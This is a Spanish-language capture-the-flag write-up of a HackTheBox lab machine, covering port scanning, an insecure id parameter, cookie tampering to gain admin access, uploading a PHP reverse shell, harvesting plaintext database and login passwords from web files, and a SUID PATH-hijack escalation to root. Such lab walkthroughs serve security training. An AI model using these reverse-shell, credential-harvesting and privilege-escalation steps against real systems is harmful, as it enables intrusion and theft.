---
title: Archetype HTB
date: 2023-02-05
author: naibu3
---

#linux

## Fase de reconocimiento

Tras comprobar si la máquina está activa con ping, en base al ttl, podemos sospechar que se trata de una máquina **linux**. Lanzamos [[nmap]]:

```shell
nmap -p- --open -sS -min-rate 5000 -n -Pn <ip>
```

Obtenemos:

```shell
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Podemos sospechar que se trata de una aplicación web, por lo que buscamos en el navegador, mientras tratamos de buscar las versiones y lanzamos scripts de enumeración:

```shell
sudo nmap -p22,80 -sCV <ip>
```

Y obtenemos:

```shell
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


### Reconocimiento con burpsuite

Burpsuite puede hacer de *web crawler*, o araña y analizar el esquema de un sitio web. Para ello primero debemos configurar firefox para que mande la información por medio de un proxy. 

#### Configurando firefox

Vamos a preferencias, buscamos proxy en la barra de búsqueda y seleccionamos *"preferences..."*. A continuación seleccionamos *"configuración manual"* y ponemos la ip `127.0.0.1` y el puerto `8080`. También es recomendable activar la opción *"Also use this proxy for FTP and HTTPS"* para asegurar que todo el trádico vaya a través del proxy.

#### Utilizando burpsuite

Antes de empezar, también debemos desabilitar la itercepción en burpsuite (que viene activa por defecto). Para ello, en la pestaña de *Proxy* y aseguramos de desabilitar el campo `Ìntercept is on`.

Ahora, ya podemos volver a la página y refrescarla con la pestaña *Target* abierta. En el árbol que se crea a la izquierda, podemos ver un directorio `/cdn-cgi/login`.


### Accediendo a la web

Al ver dicha ruta, e intentar varios usuarios y contraseñas, accedemos como invitado.
Y al investigar la pestaña *Account* vemos que hay un parámetro `id` que se pasa por url:

```python
http://10.129.156.147/cdn-cgi/login/admin.php?content=accounts&id=2
```

Si ponemos `id=1`, accederemos como el usuario administrador, viendo la siguiente información:

| Access ID | Name | Email |
|-----------|--------|-------|
| 34322 | admin | admin@megacorp.com |

Vemos también una pestaña para subir archivos, sin embargo necesitamos privilegios. En este punto, podríamos tratar de comprobar si podemos manipular alguna cookie.


## Manipulando cookies

Podemos ver y manipular cookies en Mozilla Firefox mediante el uso de las herramientas de desarrollador. Para ello vamos a la pestaña de la subida de archivos y hacemos click derecho e *"inspeccionar"*. En la sección *"storage"* (*"almacenamiento"*), vemos que tenemos una cookie `role=guest` y `user=2233`. Intentamos cambiarlo a `role=admin` y `user=34322` (credenciales que obtuvimos en el punto anterior).

Tras recargar la página, tenemos acceso a la página para subir archivos.

## Subiendo una reverse shell

Utilizaremos una reverse shell en php. Yo utilizaré la siguiente:

```php
<?php  
<SNIP>  
set_time_limit (0);  
$VERSION = "1.0";  
$ip = '127.0.0.1'; // CHANGE THIS WITH YOUR IP  
$port = 1234; // CHANGE THIS WITH YOUR LISTENING PORT  
$chunk_size = 1400;  
$write_a = null;  
$error_a = null;  
$shell = 'uname -a; w; id; /bin/sh -i';  
$daemon = 0;  
$debug = 0;  
<SNIP>  
?>
```

La subimos y probamos que se encuentre en la pestaña *"Uploads"* (`/uploads/reverse.php`). Y en efecto, existe el directorio aunque no tengamos acceso. Nos ponemos en escucha y recargamos.

Deberíamos tener abierta una shell.


## Cambiando de usuario

Antes de nada, para obtener una terminal con todos los comandos, podemos ejecutar:

```shell
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Sabemos de la existencia de un directorio `/var/www/html/cdn-cgi/login`, en el cuál, mediante la siguiente línea podemos buscar posibles contraseñas en texto plano:

```shell
cat * | grep -i passw*
```

Obteniendo:

```javascript
if($_POST["username"]==="admin" && $_POST["password"]==="MEGACORP_4dm1n!!")
<input type="password" name="password" placeholder="Password" />
```

Así que ya tenemos la contraseña `MEGACORP_4dm1n!!`. Ahora podemos buscar en el `/etc/passwd` algún usuario que le pueda corresponder. Encontramos:

```
root:x:0:0:root:/root:/bin/bash
robert:x:1000:1000:robert:/home/robert:/bin/bash
```

Así que probamos:

```shell
su robert
```

Sin embargo no funciona para ninguno de los dos. Sin embargo, si investigamos los archivos:

```shell
cat db.php
```

```php
<?php
$conn = mysqli_connect('localhost','robert','M3g4C0rpUs3r!','garage');
?>
```

Obteniendo la contraseña `M3g4C0rpUs3r!`, que sí nos permite iniciar sesión. La falg del usuario está en `/home/robert`


## Escalada de privilegios

Podemos tratar de utilizar `sudo -l`, pero vemos que robert no pertenece al grupo *sudoers*. Con `id`, podemos ver que pertenecemos al grupo *bugtracker*:

```shell
uid=1000(robert) gid=1000(robert) groups=1000(robert),1001(bugtracker)
```

Con la siguiente línea podemos buscar algún binario que pertenezca a dicho grupo:

```shell
find / -group bugtracker 2>/dev/null
```

Encontrando el fichero `/usr/bin/bugtracker`. Del que tratamos de listar su información y privilegios:

```shell
ls -la /usr/bin/bugtracker && file /usr/bin/bugtracker
```

```shell
-rwsr-xr-- 1 root bugtracker 8792 Jan 25  2020 /usr/bin/bugtracker
/usr/bin/bugtracker: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/l, for GNU/Linux 3.2.0, BuildID[sha1]=b87543421344c400a95cbbe34bbc885698b52b8d, not stripped
```

Del que vemos que tiene un privilegio `suid`, que podría ser una ruta de explotación.

### Abusando de los privilegios suid

Si ejecutamos el archivo veremos que lista otro archivo utilizando `cat`, por lo que en `/tmp` creamos un fichero que también se llame `cat`, y que contenga:

```
/bin/sh
```

Y le otorgamos privilegios de ejecución:

```shell
chmod +x cat
```

Ahora añadiremos `/tmp` al `PATH`:

```shell
export PATH=/tmp:$PATH
```

Finalmente ejecutamos el `bugtracker`, como ahora `/tmp` está antes en el `PATH`, nuestro `cat`, *malicioso* se ejecutará en lugar del original, otorgándonos una terminal como administrador.
La flag está en `/root`.

